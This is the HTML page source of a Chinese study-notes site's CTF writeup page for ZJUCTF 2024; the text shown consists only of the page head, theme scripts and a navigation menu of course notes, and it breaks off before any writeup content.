
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://note.gopoux.cc/ctf/writeups/zjuctf2024/">
      
      
        <link rel="prev" href="../../../books/ostep/chapter1/process/">
      
      
      
      <link rel="icon" href="../../../assets/ico/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.7">
    
    
      
        <title>Writeups - GoPoux 的笔记本</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.8608ea7d.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
    
    
      <link rel="stylesheet" href="../../../css/neoteroi-mkdocs.css">
    
      <link rel="stylesheet" href="../../../css/counter.css">
    
      <link rel="stylesheet" href="../../../css/stylesheet.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css">
    
      <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.1.0/style.css">
    
      <link rel="stylesheet" href="https://gcore.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#zjuctf2024-writeup" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../../.." title="GoPoux 的笔记本" class="md-header__button md-logo" aria-label="GoPoux 的笔记本" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4zM3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7zm2-2v2h2V5zm0 14h2v-2H5zm0-6h2v-2H5z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            GoPoux 的笔记本
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Writeups
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/GoPoux4/notebook/" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GoPoux4/notebook
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../.." class="md-tabs__link">
          
  
    
  
  Home

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../cs/" class="md-tabs__link">
          
  
    
  
  Computer Science

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../math/" class="md-tabs__link">
          
  
    
  
  Math

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../hpc/" class="md-tabs__link">
          
  
    
  
  HPC

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../others/" class="md-tabs__link">
          
  
    
  
  Others

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../labs/numpy/" class="md-tabs__link">
          
  
    
  
  Labs

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../books/" class="md-tabs__link">
          
  
    
  
  Books

        </a>
      </li>
    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="./" class="md-tabs__link">
          
  
    
  
  CTF

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="GoPoux 的笔记本" class="md-nav__button md-logo" aria-label="GoPoux 的笔记本" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4zM3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7zm2-2v2h2V5zm0 14h2v-2H5zm0-6h2v-2H5z"/></svg>

    </a>
    GoPoux 的笔记本
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/GoPoux4/notebook/" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GoPoux4/notebook
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../.." class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            Home
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../links/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    友链
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    Computer Science
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Computer Science
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    数据结构
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            数据结构
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/fds/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    数据结构基础
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1">
            <span class="md-nav__icon md-icon"></span>
            数据结构基础
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/fds/chapter1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Agorithm Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/fds/chapter2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lists, Stacks and Queues
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/fds/chapter3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trees
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/fds/chapter4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Union and Find
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/fds/chapter5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Graphs
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/fds/chapter6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sorting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/fds/chapter7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hashing
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/ads/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    高级数据结构与算法分析
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_2">
            <span class="md-nav__icon md-icon"></span>
            高级数据结构与算法分析
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AVL, Splay and Amortized Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Red-black Trees and B+ Trees
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Inverted File Index
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Leftist Heaps and Skew Heaps
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Binomial Queue
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Backtracking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Divide and Conquer
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter8/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dynamic Programming
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter9/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Greedy Algorithm
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NP Completeness
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Approximation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Local Search
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Randomized Algorithms
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Parallel Algorithms
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/ads/chapter15/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    External Sorting
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/computer_logic/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    计算机逻辑设计基础
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            计算机逻辑设计基础
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/computer_logic/chapter1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    数字系统和信息
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/computer_logic/chapter2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    组合逻辑电路
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/computer_logic/chapter3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    组合逻辑电路设计
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/computer_logic/chapter4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    时序逻辑电路
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/computer_logic/chapter5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    数字硬件实现
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/computer_logic/chapter6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    寄存器和寄存器传输
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/computer_logic/chapter7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    内存基础
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/database/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    数据库系统
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            数据库系统
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/database/chapter1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    数据库系统概述
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/database/chapter2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    关系模型
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cs/database/review/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    复习
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../cs/co/" class="md-nav__link ">
              
  
  <span class="md-ellipsis">
    计算机组成与设计
    
  </span>
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
